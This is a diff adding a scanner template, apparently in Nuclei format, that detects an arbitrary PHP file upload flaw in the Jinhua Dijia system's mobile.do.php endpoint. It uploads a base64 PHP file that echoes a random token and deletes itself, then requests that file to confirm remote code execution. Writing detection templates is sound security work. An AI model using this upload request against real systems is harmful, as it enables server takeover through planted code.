@@ -1,0 +1,49 @@
+id: poc-yaml-deejia-mobile-do-php-anyfile-upload
+info:
+  name: Jinhua Dijia Mobile do.php Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    The Jinhua Dijia Interactive System mobile.do.php contains a vulnerability allowing arbitrary file uploads, potentially leading to remote code execution.
+
+variables:
+  t1: '{{rand_text_alphanumeric(6)}}'
+  payload: '{{base64(concat("<?php echo ", t1, ";unlink(__FILE__);?>"))}}'
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - '{{BaseURL}}/mobile/mobile.do.php?action=msg_uploadimg'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: 'filetype=php&imgbase64={{payload}}'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "picurl"
+          - ".php"
+    extractors:
+      - type: regex
+        name: file
+        group: 1
+        regex:
+          - 'pic_(.*?).php'
+
+  - id: verify-file
+    method: GET
+    path:
+      - '{{BaseURL}}/data/pic/pic_{{file}}.php'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '{{t1}}'
